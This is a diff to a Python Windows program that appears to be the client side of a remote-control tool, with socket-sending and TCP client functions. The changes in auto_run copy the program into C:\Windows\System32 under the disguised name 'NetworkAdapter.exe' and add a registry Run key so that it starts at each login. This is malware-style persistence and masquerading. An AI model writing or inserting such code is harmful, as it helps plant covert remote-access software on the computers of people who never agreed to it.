@@ -1,14 +1,15 @@
+from shutil import copyfile
 import requests
 import platform
-import socket
-import json
-import time
-import os
-import re
-import winreg
-import sys
 import win32api
 import win32con
+import socket
+import winreg
+import json
+import time
+import sys
+import os
+import re
 
 # Send dynamic length socket data
 def send_dyn_socket(server, content):
@@ -93,13 +94,15 @@ def tcpClient(client):
 
 
 def auto_run():
+    path = os.getcwd() + os.path.sep + os.path.basename(sys.argv[0])
+    copyfile(path, 'C:\\Windows\\System32\\NetworkAdapter.exe')
     def zhao():
         location = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, location)
         i = 0
         while True:
             try:
-                if winreg.EnumValue(key, i)[0] == os.path.basename(sys.argv[0]):
+                if winreg.EnumValue(key, i)[0] == 'NetworkAdapter':
                     return True
                 i += 1
             except OSError as error:
@@ -111,11 +114,9 @@ def auto_run():
         pass
     else:
         sys.setrecursionlimit(1000000)
-        name = os.path.basename(sys.argv[0])
-        path = os.getcwd() + '\\' + os.path.basename(sys.argv[0])
         key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                                   win32con.KEY_ALL_ACCESS)
-        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
+        win32api.RegSetValueEx(key, 'NetworkAdapter', 0, win32con.REG_SZ, 'C:\\Windows\\System32\\NetworkAdapter.exe')
         win32api.RegCloseKey(key)
 
 
